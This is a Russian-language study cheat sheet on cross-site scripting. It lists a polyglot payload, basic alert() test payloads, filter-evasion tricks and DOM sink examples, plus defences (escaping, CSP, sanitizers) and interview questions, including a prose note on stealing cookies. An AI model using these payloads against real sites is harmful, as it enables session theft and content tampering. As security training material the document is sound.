#  XSS (Cross-Site Scripting)


## 📌 **1. Что такое XSS **

**XSS (Cross-Site Scripting)** — уязвимость, при которой злоумышленник может внедрить JavaScript-код на веб-страницу. Возникает, когда браузер не отличает код от данных и выполняет любой скрипт, попавший в DOM. Последствия: кража кук, сессий, подмена контента, редирект на фишинг, выполнение действий от имени пользователя.

## xss-полиглот:
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e


## 🎯 **2. Типы XSS (Главное отличие)**

| Тип | Как возникает | Где живёт | Опасность |
| :--- | :--- | :--- | :--- |
| **Reflected (Отражённый)** | Внедряется через URL-параметры или форму и сразу отображается в ответе сервера. | В URL-запросе | Средняя (атака на одного пользователя) |
| **Stored (Хранимый)** | Сохраняется в базе данных (комментарии, профили) и выполняется у всех, кто открывает страницу. | В базе данных | **Высокая** (массовая атака) |
| **DOM-based** | Выполняется на клиенте через манипуляции с DOM (без отправки на сервер). | В клиентском коде (JS) | Средняя (зависит от контекста) |


## 🔥 **3. Базовые Payloads (Для теста)**

| Payload | Что делает |
| :--- | :--- |
| `<script>alert(1)</script>` | Простой тест XSS |
| `<img src=x onerror=alert(1)>` | XSS через `onerror` |
| `<svg onload=alert(1)>` | XSS через SVG |
| `<body onload=alert(1)>` | XSS через `onload` |
| `<input onfocus=alert(1) autofocus>` | XSS через `onfocus` |
| `<iframe src="javascript:alert(1)">` | XSS через `iframe` |
| `<a href="javascript:alert(1)">click</a>` | XSS через `href` |
| `<div onmouseover="alert(1)">hover</div>` | XSS через `onmouseover` |
| `'; alert(1); //` | XSS в атрибутах или внутри `<script>` |
| `"><script>alert(1)</script>` | Закрываем тег и вставляем свой |


## 🛡️ **4. Обход фильтров (WAF / Экранирование)**

| Техника | Пример |
| :--- | :--- |
| **Разные регистры** | `<sCrIpT>alert(1)</sCrIpT>` |
| **Двойная кодировка** | `%253Cscript%253E` |
| **Обход через события** | `<img src=x onerror="alert(1)">` |
| **Без скобок** | `<script>alert` + `(1)</script>` (иногда работает) |
| **Обход через пробелы** | `<script> alert(1) </script>` |
| **Использование `/* */`** | `<script>/*comment*/alert(1)</script>` |
| **`javascript:` в ссылках** | `<a href="javascript:alert(1)">click</a>` |
| **`<svg><script>alert(1)</script></svg>`** | Работает в некоторых браузерах |


## 🧠 **5. DOM-based XSS (Особый случай)**

| Источник (Source) | Поток (Sink) | Пример |
| :--- | :--- | :--- |
| `location.hash` | `innerHTML` | `document.write(location.hash)` |
| `document.URL` | `eval()` | `eval(document.URL)` |
| `document.referrer` | `document.write()` | `document.write(document.referrer)` |
| `window.name` | `setTimeout()` | `setTimeout(window.name)` |


## 🔐 **6. Защита от XSS (Главное)**

### 6.1. На бэкенде (экранирование вывода)
- HTML-кодирование: `&` → `&amp;`, `<` → `&lt;`, `>` → `&gt;`, `"` → `&quot;`, `'` → `&#39;`
- В Django: `{{ variable }}` (автоэкранирование)
- В PHP: `htmlspecialchars($input, ENT_QUOTES, 'UTF-8')`
- В Java: `StringEscapeUtils.escapeHtml4(input)`

### 6.2. На фронтенде (безопасные API)
- ✅ Использовать `textContent` вместо `innerHTML`
- ✅ Использовать `setAttribute()` вместо прямого присвоения `href`/`src`
- ❌ **Запретить** `eval()`, `setTimeout()` со строкой, `document.write()`

### 6.3. Content Security Policy (CSP) — **САМАЯ СИЛЬНАЯ ЗАЩИТА**
```http
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted-cdn.com; object-src 'none'
```
**Что даёт:**
- Блокирует инлайн-скрипты (`<script>` без `nonce`)
- Блокирует `eval()` и `setTimeout(str)`
- Разрешает скрипты только с доверенных доменов
- Обязательно использовать **`nonce`** для разрешённых инлайн-скриптов

### 6.4. Валидация ввода (белый список)
- Только разрешённые символы (например, для имени — только буквы)
- Ограничение длины
- Регулярные выражения

### 6.5. Санитайзеры
- **DOMPurify** — очищает HTML от скриптов
- **OWASP Java HTML Sanitizer** — для Java
- **bleach** — для Python


## 📌 **7. Чего НЕ надо делать (Ошибки)**

| ❌ Неправильно | ✅ Правильно |
| :--- | :--- |
| `element.innerHTML = userInput;` | `element.textContent = userInput;` |
| `href = userInput;` | Проверять протокол (`http://`, `https://`) |
| `eval(userInput);` | **Никогда не использовать `eval()` с пользовательским вводом** |
| `document.write(userInput);` | Использовать `textContent` или `DOMPurify` |
| Полагаться только на WAF | Валидация + CSP + экранирование |



##  **8. каверзные вопросы**

### ❓ «А если CSP не разрешает инлайн-скрипты, как быть с динамическим JS?»
> *«Использовать `nonce` — генерировать случайный токен на сервере и передавать его и в CSP, и в тег `<script>`. Либо использовать `strict-dynamic` для разрешения скриптов, загруженных с доверенных CDN».*

### ❓ «Чем отличается XSS от CSRF?»
> *«XSS выполняется в браузере жертвы и ворует данные. CSRF — это выполнение действий от имени жертвы без её ведома (использует её сессию)».*

### ❓ «Как украсть куки через XSS?»
> *`document.cookie` — но если стоит флаг `HttpOnly`, то JS не получит куки. Тогда используют `fetch` или `XMLHttpRequest` для отправки данных на сервер злоумышленника.*

## Обход фильтров:
https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html
